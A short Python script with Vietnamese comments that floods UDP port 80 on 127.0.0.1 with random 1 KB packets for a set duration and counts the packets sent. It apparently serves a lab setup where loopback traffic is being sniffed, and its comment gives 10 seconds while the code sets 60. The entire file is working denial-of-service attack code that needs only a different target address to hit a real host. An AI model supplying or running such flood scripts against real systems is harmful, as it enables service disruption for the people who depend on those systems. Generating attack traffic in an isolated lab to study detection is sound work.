import socket
import random
import time

# Cấu hình tấn công
TARGET_IP = "127.0.0.1" # Vì bạn đang Sniff Loopback
TARGET_PORT = 80
DURATION = 60 # Tấn công trong 10 giây

# Tạo payload rác (1KB)
bytes_to_send = random.randbytes(1024)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f"🚀 Đang tấn công UDP Flood vào {TARGET_IP} trong {DURATION}s...")
timeout = time.time() + DURATION
sent = 0

while time.time() < timeout:
    try:
        sock.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
        sent += 1
    except Exception as e:
        print(f"Error: {e}")
        break

print(f"🛑 Đã dừng. Tổng số gói tin đã bắn: {sent}")